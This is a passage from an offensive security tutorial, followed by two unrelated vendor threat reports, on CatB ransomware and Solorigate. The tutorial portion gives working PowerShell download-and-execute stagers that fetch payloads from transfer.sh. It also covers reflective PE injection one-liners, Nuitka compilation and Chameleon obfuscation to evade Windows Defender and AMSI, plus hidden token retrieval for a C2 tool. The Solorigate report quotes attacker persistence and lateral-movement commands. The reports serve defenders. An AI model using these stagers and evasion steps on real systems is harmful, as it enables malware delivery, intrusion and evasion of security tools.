It offers flexibility in determining the number of allowed downloads and the duration for which files will be stored. 
Additionally, some of these platforms even allow for modifying the content of generated URI, enhancing the adaptability and control over the shared resources. 
By embracing this approach, we could have the capability to generate fresh RSA key pairs, empowering our tool to download a different key in the subsequent system reboot.
This becomes particularly valuable when pursuing persistence objectives. 
To enhance control, we could also incorporate a dedicated function that checks for the removal of the pub_key: if such a detection occurs, then proceed to initiate the removal of its own presence or any existing persistence mechanisms. 
Additionally, we could incorporate a special Canary Token within our script: Canary tokens are unique markers that are placed within systems or scripts to act as early warning indicators.
They allow us to detect specific events or actions with an extensive range of options to create decoy assets, each designed to provide valuable intelligence and real-time notifications: from email alerts to webhook integrations and many other features for monitoring and security needs. 
For further information check official site: https://canarytokens.org/generate 
In our case, we could configure the script to perform a designated action if the URI is no longer accessible, such as notifying us if the file has been removed.
When the script fails to download the id_rsa.pub key, it triggers a canary token, which generates a signal after encountering a 404 error status code. 
In this case we received an email alerting us of the event. 
Dynamic and crypted AUTH Ngrok Token 
In MaccaroniC2 original tool, the Ngrok Auth Token is hardcoded also. 
In this scenario, we’ll apply a similar approach as before, but with a slight twist: we want to avoid publicly uploading our token in plain text. 
To achieve this, we’ll encrypt the token and upload it to a file-sharing service like transfersh.com The script will download and decrypt the string that represents the token.
This decryption process utilizes the Fernet algorithm, ensuring the secure retrieval and utilization of the token. 
Fernet is a symmetric encryption algorithm and token format used for secure communication and data protection.
It is a part of the cryptography library in Python called “cryptography.”
It utilizes symmetric key cryptography, where the same secret key is used for both encryption and decryption.
It ensures confidentiality and integrity of data by combining encryption with a message authentication code (MAC). 
The Fernet token format includes the encrypted data and a timestamp to prevent tampering.
It provides a straightforward and secure way to encrypt and authenticate data, making it suitable for various applications that require secure communication and storage. 
def fernet_decrypt(encrypted_string, password): """Decrypt Ngrok AUTH Token""" try: key = generate_key_from_password(password) cipher = Fernet(key) decrypted_message = cipher.decrypt(encrypted_string) return decrypted_message.decode() except: exit('[-]
Error: Could not decrypt AUTH Token') def get_auth_token(): """Get AUTH Token from third party service""" try: 
url = "https://pastebin.com/raw/YYYYYY" r = requests.get(url) if r.status_code == 200: password_for_decrypt = 'P4ssw0rd!' 
crypted_data = r.text.strip('\n') return fernet_decrypt(crypted_data, password_for_decrypt) elif r.status_code == 404: 
# Here we could insert a request to a canary token to be notified of the event if the file is not found # - for persistence purpose - exit() # So Long, and Thanks for All the Fish! 
Error: Could not get AUTH Token') 
The provided code includes two functions: fernet_decrypt and get_auth_token. 
The fernet_decrypt function decrypts an encrypted string representing the Ngrok AUTH Token using a harcoded password.
It returns the decrypted message as a decoded string. 
The get_auth_token function retrieves the AUTH Token from a third-party service, in this example pastebin.
It checks the response status code and proceeds accordingly.
If the response is successful, it use the harcoded password for decryption using the fernet_decrypt function, and returns the decrypted AUTH Token. 
If the response status code is 404, we can say attack is concluded and we could insert a potential a canary token for notification purposes . 
These examples provide ideas and possibilities, showcasing how attackers can leverage High-Level languages like Python to weaponize and elevate the capabilities of their malware. 
Check full project of custom MaccaroniC2 server at: https://github.com/hacktivesec/MaccaroniC2/blob/main/weaponized_server.py Prepararing Cannons: Nuitka in action Python Nuitka is a specialized compiler for Python.
It’s designed to convert Python code into highly optimized C/C++ code, which is then compiled into native machine code.
The resulting executable can be distributed and executed without requiring the Python interpreter to be installed on the target system. 
When it comes to compiling malware, Nuitka offers some potential advantages over other Python compilers such as PyInstaller or Py2exe: 
Performance: Nuitka Compiler aims to generate highly optimized C/C++ code, which can result in improved performance compared to interpreted Python code.
This can be advantageous for malware authors who want their malicious code to execute more efficiently and quickly. 
Reduced Dependencies: By compiling Python code into standalone executables, Nuitka Compiler eliminates the need for the target system to have a Python interpreter installed.
This can make the malware distribution easier and less reliant on specific Python versions or configurations. 
Code Protection:
Nuitka Compiler employs various optimization techniques and obfuscation mechanisms during the compilation process.
This can make the resulting executable more challenging to reverse-engineer and analyze, adding an extra layer of protection for the malware. 
Detection Evasion:
As Nuitka Compiler generates native machine code, it can potentially evade certain signature-based detection methods used by security tools that primarily focus on detecting interpreted Python scripts.
This may offer a limited advantage in evading detection by some antivirus or security solutions. 
Installation and compilation is straightforward: 
python -m pip install nuitka python
-m nuitka --standalone --onefile maccaronic2_server.py Our newly generate PE file is ready to go.
We can proceed to test this under the presence of Windows Defender, ensuring that all settings, including Cloud Protection and Antitamper modes are enabled.
This will allow us to evaluate the effectiveness of our malware in evading the defensive measures implemented by Windows Defender. 
Nice !
In the absence of advanced evasion techniques such as binders, packers, and crypters, our ‘malware’ effectively bypasses Windows Defender without relying on complex obfuscation methods. 
Let’s try on VirusTotal Not bad ! 
While some vendors were able to spot the malware itself, they seemed to focus on detecting the use of the Nuitka compiler.
Recognizing this pattern, i realized that by making targeted modifications to the Nuitka compiler code, we could potentially achieve 100% FUD (Fully Undetected) obfuscation. 
However, it is crucial to remember that this approach requires a deep understanding of both malware detection techniques employed by antiviruses.
It also demands continuous research and adaptation as antivirus technologies evolve.
This just opens up new possibilities for evading detection, when using Python to develop malware. 
It should be noted anyway in the world of real malware development, seasoned and skilled adversaries often turn to programming languages such as C and C++ to craft their malicious creations at a lower level. 
While higher-level languages like Python offer ease of use and rapid development, the power and control provided by lower-level languages are paramount in the realm of sophisticated malware: one of the primary reasons for choosing C and C++ is the level of control they provide over system resources and hardware.
These languages allow direct memory manipulation, access to system APIs, and the ability to write efficient and optimized code. 
This level of control enables malware developers to create stealthy, complex, and tailored malicious functionalities that can evade detection and exploit vulnerabilities in the targeted environment. 
Windows Shortcut (LNK) “Weaponize” is a term that refers to the first phase of the kill chain and it is categorized as the Build Capabilities technique under Resource Development tactic of the MITRE ATT&CK framework. 
Building capabilities consist of creating custom payloads, post-compromise and remote access tool development, creating infected removable media, and similar techniques.
The goal is to create and deliver the first payload to the target according to the environment. 
Several tools are available to create an initial payload, such as a self-extracting archive (SFX).
A classic technique used mostly by Advanced Persistent Threat (APT) groups is the use of LNK files when delivering malware: shortcut files that point to other files. 
These files have been used as an attack vector as early as 2013.
For example, the APT group Gamaredon has put LNK files to work, including a campaign that started in August 2022 against organizations in Ukraine. 
Attackers are using LNK files to download malware or other malicious files by leveraging legitimate native apps, such as PowerShell. 
For instance, this is a PowerShell one-liner that can be used to download and execute a remote .ps1 or .exe file: powershell "IEX(New-Object Net.
WebClient).downloadString('http://IP:PORT/malicious.ps1')" The .ps1 file could be a simple stager download of an .exe file and its execution.
This is a clever technique that has been used for years, including in the Stuxnet attacks that were first uncovered in 2010. 
It’s an effective technique because it exploits a fundamental feature of Windows, which is to automatically launch executables using the metadata stored in the LNK file. 
The .ps1 file can also be a complex script that can also achieve persistence with more functionalities. 
Some attackers go even further by appending the stager to the LNK file.
In this case, the PowerShell one-liner will find, decrypt, and execute code appended to the original file.
Lastly, this will run a series of “stagers” with the object to delivery the final malware inside the victim’s computer. 
An ounce of practice is worth more than tons of preaching Gandhi After theory, comes practice! 
One Shot, One Kill – Upload PE File Before start coding the .ps1 stager, we need to upload the PE file build early, using transfersh.com: curl -H "Max-Downloads: 1" -H "Max-Days: 5" --upload-file ./final_server.exe
https://transfersh.com/WindowsUpdate Output: https://transfersh.com/XXXXXXXX/WindowsUpdate After one download the file will be deleted and link will returns a 404 error.
We can choose also how many days the file be stored. 
Powershell Stager / Dropper $down = New-Object System.
Net.
WebClient $url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate' $file =
[System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'WindowsUpdate.exe') $down.
DownloadFile($url, $file) $exec = New-Object -ComObject shell.application $exec.
ShellExecute($file) 
This is a simple PowerShell script that downloads a file from a fixed location and executes it. 
Here’s what each line does: $down = New-Object System.
WebClient 
This line creates a new WebClient object and assigns it to the variable $down.
The WebClient class provides common methods for sending data to and receiving data from a resource identified by a URI. 
$url = 'https://transfersh.com/ZZZZZZZ/WindowsUpdate' This line sets the value of the $url variable to the URL of the file to be downloaded. 
$file =
[System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'WindowsUpdate.exe') 
This line uses the Combine method of the Path class to combine the temporary folder path (retrieved using the GetTempPath method) with the file name ‘WindowsUpdate.exe’.
The resulting path is assigned to the $file variable. $down.
DownloadFile($url, $file) 
This line uses the DownloadFile method of the WebClient object to download the file from the specified URL and save it to the specified local file path. 
$exec = New-Object -ComObject shell.application This line creates a new Shell.
Application COM object and assigns it to the $exec variable.
The Shell.
Application object provides methods for working with the Windows shell. 
$exec.
This line uses the ShellExecute method of the Shell.
Application object to execute the downloaded file. 
But we want more.
It’s important to note that we have previously configured the Max-Download parameter to a one-shot only download. 
In addition to the previous modifications, we now aim to keep track of every attempt to execute our stager after the initial compromise: whenever a 404 error is detected, indicating that the file is no longer available on the server, we’ll request a URL using canarytokens.org As said early this serves as a signal to log the event and provides valuable information for monitoring and analysis purposes. 
Powershell Stager with trigger $down = New-Object System.
[System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'WindowsUpdate.exe') $request =
[System.Net.WebRequest]::Create($url) $request.
Method = 'HEAD' $response = $null try { $response = $request.
GetResponse() $statusCode =
[int]$response.StatusCode if ($statusCode -eq 200) { # Successful response with HTTP status code 200 $down.
DownloadFile($url, $file) $exec = New-Object -ComObject shell.application $exec.
ShellExecute($file) } } catch [System.
WebException] { $statusCode =
[int]$_.Exception.Response.
StatusCode if ($statusCode -eq 404) { # File not found, make a GET request to a fixed URI generated on canarytokens.org $fixedUrl = 'http://canarytokens.com/feedback/about/XXXXXXXXXX/submit.aspx' $response = $down.DownloadString($fixedUrl) } else { throw } } By implementing a smart error handling mechanism we can enhance our system’s monitoring capabilities: upon receiving a 404 response from a specific URL, we can trigger a subsequent GET request to a fixed URI generated on canarytokens.org. 
This script will not trigger AMSI (Antimalware Scan Interface), providing an advantage in evading detection.
However, to add an extra layer of complexity and challenge for malware analysts, we will apply some obfuscation techniques using a helpful tool like Chameleon: https://github.com/klezVirus/chameleon This tool has been developed as a Python port of the Chimera project, by tokioneon_. 
As such, it uses mostly the same techniques to evade common detection signatures, like: comment deletion/substitution string substitution (variables, functions, data-types) variable concatenation indentation randomization semi-random backticks insertion case randomization encoding Let’s try: python chameleon.py -n
-v -b -K hacktivesec -t
h .\download-execute_full.ps1 -o obfuscated_stager.ps1 
By incorporating obfuscation techniques our script becomes a little bit more challenging to analyze. 
It should be noted that this entire procedure will leave traces on filesystem.
The PE file is downloaded on filesystem and than executed.
To enhance operational security, we can employ a clever alternative approach that eliminates the need to download files directly onto the victim’s computer: PE reflective injection. 
Reflective PE injection Reflective PE injection is a technique used by malware or advanced attackers to inject a Portable Executable (PE) file directly into the memory of a running process without the need for writing the file to disk.
Unlike traditional injection methods, which involve loading an external DLL or injecting code into the target process, reflective PE injection allows the malware to load and execute its code directly from memory. 
The term “reflective” refers to the ability of the injected code to reflect upon itself and perform necessary operations to execute within the process’s memory space.
This technique is often employed to bypass security mechanisms that monitor or block external DLL loading or code injection. 
In reflective PE injection, the PE file is parsed and its sections are reconstructed in the target process’s memory.
The necessary data structures, such as headers and import tables, are reconstructed as well.
By doing so, the injected code can appear as a legitimate part of the process, making it more difficult to detect and analyze. 
Once the PE file is injected and reconstructed in memory, the execution flow can be redirected to the injected code, enabling the malware to operate within the context of the compromised process. 
This technique provides several advantages to attackers, including stealthiness, persistence, and the ability to leverage the privileges and resources of the compromised process. 
PowerSploit does provide a module called “Invoke-ReflectivePEInjection” that facilitates reflective PE injection using PowerShell.
This module allows the injection of a PE file into a remote or local process’s memory without writing it to disk, but being a well-known and widely-used tool, it has gained significant attention from security vendors and technologies, including the Antimalware Scan Interface (AMSI). 
As a result, AMSI has become increasingly adept at detecting and flagging the usage of PowerSploit’s modules and techniques and other famous tools.
But we’ll see how to bypass this. 
Powershell Stager with Invoke-ReflectivePEInjection (New-Object System.
Net.WebClient).DownloadString('https://example.com/ReflectivePEInjection.ps1') | IEX $remoteUrl = "https://transfersh.com/XXXXXXX/whatever.exe" $webClient = New-Object System.
WebClient $PEBytes = $webClient.DownloadData($remoteUrl) Invoke-ReflectivePEInjection -PEBytes $PEBytes We can host this script somewhere and then run as usually in a fancy oneliner like: powershell -nop
-exec bypass -c "(New-Object System.
WebClient).DownloadString('https://transfersh.com/XXXXXXX/runme.ps1') | IEX" 
In this way, we can directly run the executable in the memory of a running process without the need to write the file to disk. 
However when AMSI (Antimalware Scan Interface) is activated, it will alert us, as mentioned before. 
Conclusion The first part of this article concludes here, however, our exploration doesn’t end here! 
In the next upcoming article, we will dive deep into the intricacies of bypassing AMSI, unraveling detailed techniques and methods that will empower us to evade it.
We will also explore cutting-edge countermeasures to enhance our offensive capabilities. 
Moreover, we’ll delve into a wide range of exciting topics, including: User-level persistence to establish long-term presence and maintain access on compromised systems. 
Exploring advanced exfiltration techniques, enabling the covert transfer of sensitive data from target environments. 
Spawning new Command and Control (C2) agents, expanding our reach and maintaining resilient communication channels. 
Hijack Execution Flow: the art of DLL Side-Loading ! Thank you for reading! 
References Happy 0 0 % Sad 0 0 % Excited 1 100 % Sleepy 0 0 % 
Angry 0 0 % Surprise 0 0 % 
title: CatB Ransomware | File Locker Sharpens Its Claws to Steal Data with MSDTC Service DLL Hijacking url: https://www.sentinelone.com/blog/decrypting-catb-ransomware-analyzing-their-latest-attack-methods/ The CatB ransomware family, sometimes referred to as CatB99 or Baxtoy, was first observed in late 2022, with campaigns being observed steadily since November.
The group’s activities have gained attention due to their ongoing use of DLL hijacking via Microsoft Distributed Transaction Coordinator (MSDTC) to extract and launch ransomware payloads. 
String similarities in the ransom notes as well as modifications left by the ransomware payloads suggest that CatB may be either an evolution or direct rebrand of the Pandora ransomware, which was active in early to mid-2022 and targeted the automotive industry. 
In this post, we offer a technical analysis of the CatB ransomware and its abuse of the legitimate MSDTC service, describing its evasion tactics, encryption behavior, and its attempts to steal credentials and browser data. 
CatB Ransomware Technical Information CatB payloads are distributed as a two DLL set.
A dropper DLL is responsible for initial evasive environmental checks as well as dropping and launching the second DLL, which serves the ransomware payload. 
CatB Ransomware Process Graph First, the dropper is distributed in the form of a UPX-packed DLL (versions.dll).
This dropper deposits the second DLL payload (oci.dll) onto the target host.
The dropper DLL is responsible for any sandbox evasion techniques required by the threat actor.
Sandbox evasion inhibits the analysis process and ultimately leads to more time in the target environment for the attacker. 
CatB performs three primary checks in an attempt to determine if the payload is being executed within a virtual environment.
These are direct checks for type and size of physical RAM, type and size of physical hard disks, and checking for odd or anomalous combinations of processors and cores. 
Upon execution, CatB payloads rely on DLL search order hijacking to drop and load the malicious payload.
The dropper (versions.dll) drops the payload (oci.dll) into the System32 directory. 
Oci.dll payloads in System32 (view from Singularity Console) 
The malware then abuses the MSDTC service, manipulating the permissions and startup parameters.
As a result, the system will inject the malicious oci.dll into the service’s executable (msdtc.exe) when the MSDTC service is restarted.
Taskill.exe is used to terminate the msdtc.exe process once the service configuration changes have been made. 
Msdtc.exe termination syntax CatB ransomware excludes the following files and extensions from the encryption process: .msi, .dll, .sys, .iso and NTUSER.DAT. 
Encryption exclusions in payload DLL 
In addition to the hardcoded exclusions, the local disk volumes to be encrypted are also configured in a similar manner.
By default, the oci.dll payload will attempt to encrypt C:\users (crawl whole tree), I:, H:, G:, F:, E:, and D:. 
Local encryption targets in oci.dll The lack of post-encryption alterations is a trait that sets CatB apart from other contemporaries.
Once encrypted, there is no blatant indicator – no separate ransom note dropped, no change to the desktop wallpaper, and no antagonizing file extensions.
Instead, what could be considered the ransom note is inserted into the beginning of each encrypted file. 
Ransom note appended to head of encrypted file (catb991 variation) 
Per the ransom note, the only way to engage the threat actor is via email at the provided catB9991 protonmail address.
Beyond that, a single Bitcoin (BTC) address is provided for payment submissions.
The ransom price is set to increase each day for five days and, following the fifth day, there will be “permanent data loss” if the victim does not comply. 
Based on observations, there is no evidence to indicate that CatB operators are generating payment wallets for each victim as the Bitcoin address provided is not unique to each sample. 
Generation of unique key file A key file is deposited onto each infected host in c:\users\public\. This file must be included in email correspondence with the attackers as it is, ideally, a unique identifier for each victim or host. 
Key file dropped for each victim Example CatB ‘key’ file Credential and Browser Data Theft 
In addition to file encryption and obfuscation, the CatB malware will attempt to gather specific, sensitive information from targeted systems.
This includes browser session and credential data. 
The ransomware contains functionality to discover and extract user data from Mozilla Firefox, Google Chrome, Microsoft Edge as well as Internet Explorer.
Data extracted from browsers includes bookmarks, blocklists, crash logs, history, user profile data, autofill data, environmental settings, browser session keys, and more. 
CatB malware will also attempt to locate and extract sensitive information from Windows Mail profile data (\AppData\Local\Microsoft\Windows Mail\). 
Variations of CatB Threat Campaigns Samples pulled from a November 2022 campaign feature a different contact email address, fishA001[@]protonmail.com.
This later changes to the catB9991 protonmail address mentioned above.
This is the only difference with regards to the ransom notes.
Other details such as payment-per-day breakdowns and the BTC payment address are identical. 
Alternate ransom note (fisha001) 
We have also encountered variations which include both email addresses.
When these ‘double email’ notes are appended to the head of files, it looks as follows: Alternate ransom note (double-email, no BTC) 
These ransom notes display all the same features minus the BTC payment address.
Also missing is the requirement to submit the key file in c\users\public\key.
Notes that are missing the key submission feature suggest that they are artifacts of an earlier ‘test’ version of the ransomware. 
BTC Payment / Blockchain Status As the time of writing, the BTC address associated with CatB ransomware have zero transactions and a zero balance. 
BTC Balance for Wallet – bc1qakuel0s4nyge9rxjylsqdxnn9nvyhc2z6k27gz Conclusion CatB joins a long line of ransomware families that embrace semi-novel techniques and atypical behaviors such as appending notes to the head of files.
These behaviors appear to be implemented in the interest of detection evasion and some level of anti-analysis trickery.
For example, many environments rely solely on the appearance of ransom notes to alert them to the potential of a ransomware outbreak.
This is not the case with CatB. Despite that, the threat lacks in overall sophistication, and a modern, properly configured, XDR/EDR solution should alert quickly upon initiation of a CatB attack in the environment. 
SentinelOne Singularity fully prevents and protects customers against malicious behaviors associated with CatB Ransomware. Indicators of Compromise SHA1 CatB Samples 1028a0e6cecb8cfc4513abdbe3b9d948cf7a5567 8c11109da1d7b9d3e0e173fd24eb4b7462073174 951e603af10ec366ef0f258bf8d912efedbb5a4b (early version note example) db99fc79a64873bef25998681392ac9be2c1c99c dd3d62a6604f28ebeeec36baa843112df80b0933 Email addresses catB9991[at]protonmail[.]com fishA001[at]protonmail[.]com BTC Wallets bc1qakuel0s4nyge9rxjylsqdxnn9nvyhc2z6k27gz 
title: Analyzing Solorigate, the compromised DLL file that started a sophisticated cyberattack, and how Microsoft Defender helps protect customers url: https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/ We, along with the security industry and our partners, continue to investigate the extent of the Solorigate attack.
While investigations are underway, we want to provide the defender community with intelligence to understand the scope, impact, remediation guidance, and product detections and protections we have built in as a result.
We have established a resource center that is constantly updated as more information becomes available at https://aka.ms/solorigate. 
While the full extent of the compromise is still being investigated by the security industry as a whole, in this blog we are sharing insights into the compromised SolarWinds Orion Platform DLL that led to this sophisticated attack.
The addition of a few benign-looking lines of code into a single DLL file spelled a serious threat to organizations using the affected product, a widely used IT administration software used across verticals, including government and the security industry.
The discreet malicious codes inserted into the DLL called a backdoor composed of almost 4,000 lines of code that allowed the threat actor behind the attack to operate unfettered in compromised networks. 
The fact that the compromised file is digitally signed suggests the attackers were able to access the company’s software development or distribution pipeline.
Evidence suggests that as early as October 2019, these attackers have been testing their ability to insert code by adding empty classes.
Therefore, insertion of malicious code into the SolarWinds.Orion.Core.BusinessLayer.dll likely occurred at an early stage, before the final stages of the software build, which would include digitally signing the compiled code.
As a result, the DLL containing the malicious code is also digitally signed, which enhances its ability to run privileged actions—and keep a low profile. 
In many of their actions, the attackers took steps to maintain a low profile.
For example, the inserted malicious code is lightweight and only has the task of running a malware-added method in a parallel thread such that the DLL’s normal operations are not altered or interrupted.
This method is part of a class, which the attackers named OrionImprovementBusinessLayer to blend in with the rest of the code.
The class contains all the backdoor capabilities, comprising 13 subclasses and 16 methods, with strings obfuscated to further hide malicious code. 
Once loaded, the backdoor goes through an extensive list of checks to make sure it’s running in an actual enterprise network and not on an analyst’s machines.
It then contacts a command-and-control (C2) server using a subdomain generated partly from information gathered from the affected device, which means a unique subdomain for each affected domain.
This is another way the attackers try to evade detection. 
With a lengthy list of functions and capabilities, this backdoor allows hands-on-keyboard attackers to perform a wide range of actions.
As we’ve seen in past human-operated attacks, once operating inside a network, adversaries can perform reconnaissance on the network, elevate privileges, and move laterally.
Attackers progressively move across the network until they can achieve their goal, whether that’s cyberespionage or financial gain. 
Figure 1.
Solorigate malware infection chain 
The challenge in detecting these kinds of attacks means organizations should focus on solutions that can look at different facets of network operations to detect ongoing attacks already inside the network, in addition to strong preventative protection. 
We have previously provided guidance and remediation steps to help ensure that customers are empowered to address this threat.
In this blog, we’ll share our in-depth analysis of the backdoor’s behavior and functions, and show why it represents a high risk for business environments.
We’ll also share details of the comprehensive endpoint protection provided by Microsoft Defender for Endpoint.
In another blog, we discuss protections across the broader Microsoft 365 Defender, which integrates signals from endpoints with other domains – identities, data, cloud – to provide coordinated detection, investigation, and remediation capabilities.
Read: Using Microsoft 365 Defender to protect against Solorigate. 
Where it all starts: A poisoned code library The attackers inserted malicious code into SolarWinds.Orion.Core.BusinessLayer.dll, a code library belonging to the SolarWinds Orion Platform.
The attackers had to find a suitable place in this DLL component to insert their code.
Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.
Such a suitable location turns out to be a method named RefreshInternal. 
Figure 2: The method infected with the bootstrapper for the backdoor Figure 3: What the original method looks like The modification to this function is very lightweight and could be easily overlooked—all it does is to execute the method OrionImprovementBusinessLayer.
Initialize within a parallel thread, so that the normal execution flow of RefreshInternal is not altered. 
Why was this method chosen rather than other ones?
A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.
Orion.
Core.
BusinessLayer.
BackgroundInventory.
InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.
The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks.
Among those tasks is Background Inventory, which ultimately starts the malicious code. 
Figure 4.
The inserted malicious code runs within a parallel thread The functionality of the backdoor resides entirely in the class OrionImprovementBusinessLayer, comprising 13 subclasses and 16 methods.
Its name blends in with the rest of the legitimate code.
The threat actors were savvy enough to avoid give-away terminology like “backdoor”, “keylogger”, etc., and instead opted for a more neutral jargon.
At first glance, the code in this DLL looks normal and doesn’t raise suspicions, which could be part of the reason why the insertion of malicious code was undetected for months, especially if the code for this DLL was not frequently updated. 
To have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead. 
Figure 5: Example of obfuscated strings Initial reconnaissance The Initialize method is the de facto execution entry point of the backdoor.
It carries out several checks to verify that it is running in a real victim’s environment: It verifies that the process hosting the malicious DLL is named solarwinds.businesslayerhost.exe 
It checks that the last write-time of the malicious DLL is at least 12 to 14 days earlier It delays execution by random amounts of time 
It verifies that the domain name of the current device meets the following conditions: The domain must not contain certain strings; the check for these strings is implemented via hashes, so at this time the domain names that are block-listed are unknown The domain must not contain “solarwinds” The domain must not match the regular expression (?i)([^a-z]|^)(test)([^a-z]|$), or in simpler terms, it must not look like a test domain It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark) 
It checks that there are no drivers loaded from security-related software (e.g., groundling32.sys) 
It checks that the status of certain services belonging to security-related software meets certain conditions (e.g., windefend, sense, cavp) 
It checks that the host “api.solarwinds.com” resolves to an expected IP address If any of these checks fail, the backdoor terminates.
All these inspections are carried out to avoid exposing the malicious functionality to unwanted environments, such as test networks or machines belonging to SolarWinds. 
The backdoor After the extensive validation described above, the backdoor enters its main execution stage.
At its core, the backdoor is a very standard one that receives instructions from the C2 server, executes those instructions, and sends back information.
The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it’s executing from a trusted, signed binary. 
In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.
The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.
This means that every affected device generates a different subdomain to contact (and possibly more than one).
Here’s an example of a generated domain: Figure 6: Dynamically generated C2 domain The dynamically generated portion of the domain is the interesting part.
It is computed by hashing the following data: The physical address of the network interface The domain name of the device The content of the MachineGuid registry value from the key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography The backdoor also generates a pseudo-random URI that is requested on the C2 domain.
Like the domain, the URI is composed using a set of hardcoded keywords and paths, which are chosen partly at random and partly based on the type of HTTP request that is being sent out.
Possible URIs that can be generated follow these formats: pki/crl/<random components>.crl, where <random components> can be numbers and one of the following strings: “-root” “-cert” “-universal_ca” “-ca” “-primary_ca” “-timestamp” “-global” “-secureca” fonts/
woff/<random components>-webfont<random component>.woff2 or fonts/woff/<random components>.woff2, where the <random components> can be numbers and one or more of the following strings: “Bold” “BoldItalic” “ExtraBold” “ExtraBoldItalic” “Italic”, “Light” “LightItalic” “Regular” “SemiBold” “SemiBoldItalic” “opensans” “noto” “freefont” “SourceCodePro” “SourceSerifPro” “SourceHanSans” “SourceHanSerif” swip/upd/<random components>, where <random components> can be one or more of the following strings: “SolarWinds” “.CortexPlugin” “.Orion” “Wireless” “UI” “Widgets” “NPM” “Apollo” “CloudMonitoring” “Nodes”, “Volumes”, “Interfaces”, “Components” swip/Upload.ashx swip/Events Here are examples of final URLs generated by the backdoor: hxxps://3mu76044hgf7shjf[.]appsync-api[.]eu-west-1[.]avsvmcloud[.]com /swip/upd/Orion[.]Wireless[.]xml hxxps://3mu76044hgf7shjf[.]appsync-api[.]us-east-2[.]avsvmcloud[.]com /pki/crl/492-ca[.]crl hxxps://3mu76044hgf7shjf[.]appsync-api[.]us-east-1[.]avsvmcloud[.]com /fonts/woff/6047-freefont-ExtraBold[.]woff2 Finally, the backdoor composes a JSON document into which it adds the unique user ID described earlier, a session ID, and a set of other non-relevant data fields.
It then sends this JSON document to the C2 server. Figure 7: Example of data generated by the malware If the communication is successful, the C2 responds with an encoded, compressed buffer of data containing commands for the backdoor to execute.
The C2 might also respond with information about an additional C2 address to report to.
The backdoor accepts the following commands: Idle Exit SetTime CollectSystemDescription UploadSystemDescription RunTask GetProcessByDescription KillTask GetFileSystemEntries WriteFile FileExists DeleteFile GetFileHash ReadRegistryValue SetRegistryValue DeleteRegistryValue GetRegistrySubKeyAndValueNames Reboot None In a nutshell, these commands allow the attackers to run, stop, and enumerate processes; read, write, and enumerate files and registry keys; collect and upload information about the device; and restart the device, wait, or exit.
The command CollectSystemDescription retrieves the following information: Local Computer Domain name Administrator Account SID HostName Username OS Version System Directory Device uptime Information about the network interfaces Resulting hands-on-keyboard attack Once backdoor access is obtained, the attackers follow the standard playbook of privilege escalation exploration, credential theft, and lateral movement hunting for high-value accounts and assets.
To avoid detection, attackers renamed Windows administrative tools like adfind.exe which were then used for domain enumeration. 
C:\Windows\system32\cmd.exe /C
csrss.exe -h breached.contoso.com -f
(name=”Domain Admins”) member -list | csrss.exe -h breached.contoso.com -f
objectcategory=* > .\Mod\mod1.log Lateral movement was observed via PowerShell remote task creation, as detailed by FireEye and Volexity: $scheduler = New-Object -ComObject (“Schedule.
Service”);$scheduler.
Connect($env:
COMPUTERNAME);$folder = $scheduler.
GetFolder(“\Microsoft\Windows\SoftwareProtectionPlatform”);$task = $folder.
GetTask(“EventCacheManager”);$definition = $task.
Definition;$definition.
Settings.
ExecutionTimeLimit = “PT0S”;$folder.
RegisterTaskDefinition($task.
Name,$definition,6,”System”,$null,5);echo “Done” C:\Windows\system32\cmd.exe /C schtasks /create /F
/tn “\Microsoft\Windows\SoftwareProtectionPlatform\EventCacheManager” /tr
“C:\Windows\SoftwareDistribution\EventCacheManager.exe” /sc ONSTART /ru system /S
[machine_name] Persistence is achieved via backdoors deployed via various techniques: 
PowerShell: Powershell -nop -exec bypass -EncodedCommand The –EncodedCommand, once decoded, would resemble: Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\windows\idmu\common\ypprop.dll _XInitImageFuncPtrs’ -ComputerName
WORKSTATION Rundll32: C:\Windows\System32\rundll32.exe C:\Windows\Microsoft.
NET\Framework64\[malicious .dll
file], [various exports] With Rundll32, each compromised device receives a unique binary hash, unique local filesystem path, pseudo-unique export, and unique C2 domain. 
The backdoor also allows the attackers to deliver second-stage payloads, which are part of the Cobalt Strike software suite.
We continue to investigate these payloads, which are detected as Trojan:Win32/Solorigate.A!dha, as the situation continues to unfold. 
Microsoft Defender for Endpoint product and hardening guidance Supply chain compromise continues to be a growing concern in the security industry.
The Solorigate incident is a grave reminder that these kinds of attacks can achieve the harmful combination of widespread impact and deep consequences for successfully compromised networks.
We continue to urge customers to: Isolate and investigate devices where these malicious binaries have been detected Identify accounts that have been used on the affected device and consider them compromised Investigate how those endpoints might have been compromised Investigate the timeline of device compromise for indications of lateral movement Hardening networks by reducing attack surfaces and building strong preventative protection are baseline requirements for defending organizations.
On top of that, comprehensive visibility into system and network activities drive the early detection of anomalous behaviors and potential signs of compromise.
More importantly, the ability to correlate signals through AI could surface more evasive attacker activity. 
Microsoft Defender for Endpoint has comprehensive detection coverage across the Solorigate attack chain.
These detections raise alerts that inform security operations teams about the presence of activities and artifacts related to this incident.
Given that this attack involves the compromise of legitimate software, automatic remediation is not enabled to prevent service interruption.
The detections, however, provide visibility into the attack activity.
Analysts can then use investigation and remediation tools in Microsoft Defender Endpoint to perform deep investigation and additional hunting. 
Microsoft 365 Defender provides visibility beyond endpoints by consolidating threat data from across domains – identities, data, cloud apps, as well as endpoints – delivering coordinated defense against this threat.
